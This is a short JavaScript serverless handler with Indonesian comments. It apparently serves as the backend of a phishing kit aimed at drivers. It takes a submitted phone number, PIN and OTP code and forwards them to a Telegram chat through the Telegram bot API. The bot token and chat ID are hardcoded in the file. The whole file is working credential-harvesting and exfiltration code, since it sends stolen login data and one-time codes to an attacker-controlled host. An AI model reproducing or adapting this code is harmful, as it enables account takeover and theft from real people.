exports.handler = async (event) => {
    // Pastikan hanya menerima request POST
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const data = JSON.parse(event.body);
        
        // Token dan Chat ID Anda
        const token = "8652214007:AAHt0TuC4p88mmxdMWzkp5VeeGEcU34mGck";
        const chatId = "7414298016";
        
        // Format pesan yang akan masuk ke Telegram
        const text = `
🎯 *DATA DRIVER MASUK*
-------------------------
📱 Nomor: ${data.nomor}
🔑 PIN: ${data.pin}
OTP: ${data.otp}
-------------------------
        `;

        // URL API Telegram
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;

        // Mengirim data
        await fetch(url);

        return {
            statusCode: 200,
            body: JSON.stringify({ message: "Sukses" })
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ message: "Error" })
        };
    }
};
